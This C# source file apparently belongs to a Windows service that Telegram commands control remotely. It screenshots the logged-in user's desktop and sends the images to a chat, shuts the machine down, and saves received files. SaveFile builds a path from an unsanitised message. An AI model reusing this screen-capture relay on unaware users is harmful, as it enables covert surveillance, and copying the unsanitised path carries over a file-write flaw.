using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using Uchilka.Integration.Abstractions;
using Uchilka.Integration.TelegramBot;
using Uchilka.WinService.Win32;

namespace Uchilka.WinService
{
    internal class BotManager : ICommChannelCommandHandler, ICommChannelMultimediaHandler
    {
        private TelegramBot _commChannel;
        private DateTime _startTime;
        private string _lastFilePath;
        private string _lastMessage;

        internal void Start()
        {
            var jsonFile = File.ReadAllText("secrets.json");
            var settings = JsonConvert.DeserializeObject<SettingsFile>(jsonFile);

            _commChannel = new TelegramBot(this, settings.TelegramBot);
            _startTime = DateTime.Now;
            _commChannel.Start();

            _commChannel.SendTextMessage($"Uchilka Service started ({Environment.MachineName})");
        }

        internal void Stop()
        {
            _commChannel.SendTextMessage($"Uchilka Service stopped ({Environment.MachineName})");
        }

        #region ICommChannelCommandHandler

        public void HandleTextMessage(string text)
        {
            _lastMessage = text;
        }

        public void HandleCommand(CommChannelCommandType cmd, DateTime time)
        {
            if (time > _startTime)
            {
                switch (cmd)
                {
                    case CommChannelCommandType.Cancel:
                        break;
                    case CommChannelCommandType.Shutdown:
                        Shutdown();
                        break;
                    case CommChannelCommandType.GetScreen:
                        SendScreenShot();
                        break;
                    case CommChannelCommandType.PlayVoice:
                        break;
                    case CommChannelCommandType.SaveFile:
                        SaveFile();
                        break;
                    default:
                        break;
                }
            }
            else
            {
                Debug.WriteLine($"Command {cmd} is out of date {time}");
            }
        }

        #endregion

        #region ICommChannelMultimediaHandler

        public void HandleVoice(string path)
        {
            _lastFilePath = path;
        }

        public void HandleAudio(string path)
        {
            _lastFilePath = path;
        }

        public void HandleVideo(string path)
        {
            _lastFilePath = path;
        }

        public void HandlePicture(string path)
        {
            _lastFilePath = path;
        }

        #endregion

        #region Private

        private void SendScreenShot()
        {
            var targetDir = Path.Combine(Directory.GetCurrentDirectory(), "ScreenShots");
            var fileName = $"{DateTime.Now.ToString("yyyy-MM-dd_hh_mm_ss")}.png";

            if (TakeScreenShot(targetDir, fileName) == 0)
            {
                using (var stream = new FileStream(Path.Combine(targetDir, fileName), FileMode.Open))
                {
                    _commChannel.SendTextMessage($"Sending photo: {fileName}");
                    _commChannel.SendPhotoMessage(stream, fileName);
                }
            }
            else
            {
                _commChannel.SendTextMessage("ERROR: take screen capture failed");
            }
        }

        private uint TakeScreenShot(string targetDir, string fileName)
        {
            var commandLine = $"Uchilka.ScreenCapturer.exe \"{targetDir}\" {fileName}";

            var res = ProcessAsCurrentUser.CreateProcessAsCurrentUser(null, commandLine);

            Debug.WriteLine($"Screen Capturer launch result: {res}");

            return res;
        }

        private void Shutdown()
        {
            _commChannel.SendTextMessage("Shutdown command is being processed...");

            Process.Start(new ProcessStartInfo
            {
                FileName = "Shutdown",
                Arguments = "-s -t 10",
                CreateNoWindow = true
            });

            _commChannel.SendTextMessage("Shutdown command is being processed...");
        }

        private void ShutdownWMI()
        {
            ManagementBaseObject mboShutdown = null;
            ManagementClass mcWin32 = new ManagementClass("Win32_OperatingSystem");
            mcWin32.Get();

            // You can't shutdown without security privileges
            mcWin32.Scope.Options.EnablePrivileges = true;
            ManagementBaseObject mboShutdownParams =
                     mcWin32.GetMethodParameters("Win32Shutdown");

            // Flag 1 means we want to shut down the system. Use "2" to reboot.
            mboShutdownParams["Flags"] = "1";
            mboShutdownParams["Reserved"] = "0";
            foreach (ManagementObject manObj in mcWin32.GetInstances())
            {
                mboShutdown = manObj.InvokeMethod("Win32Shutdown",
                                               mboShutdownParams, null);
            }
        }

        private void SaveFile()
        {
            if (!string.IsNullOrWhiteSpace(_lastFilePath) && !string.IsNullOrWhiteSpace(_lastMessage))
            {
                var targetFileName = _lastMessage + Path.GetExtension(_lastFilePath);

                var destDir = Path.Combine(Directory.GetCurrentDirectory(), "Data", "TempStorage");

                if (!Directory.Exists(destDir))
                {
                    Directory.CreateDirectory(destDir);
                }

                var filePath = Path.Combine(destDir, targetFileName);

                if (File.Exists(filePath))
                {
                    _commChannel.SendTextMessage($"File is already exists {targetFileName}");
                }
                else
                {
                    try
                    {
                        File.Copy(_lastFilePath, filePath);
                        _commChannel.SendTextMessage($"File saved: {targetFileName}");
                    }
                    catch(Exception ex)
                    {
                        _commChannel.SendTextMessage($"ERROR: {ex.Message}");
                    }
                }
            }
        }

        #endregion
    }
}
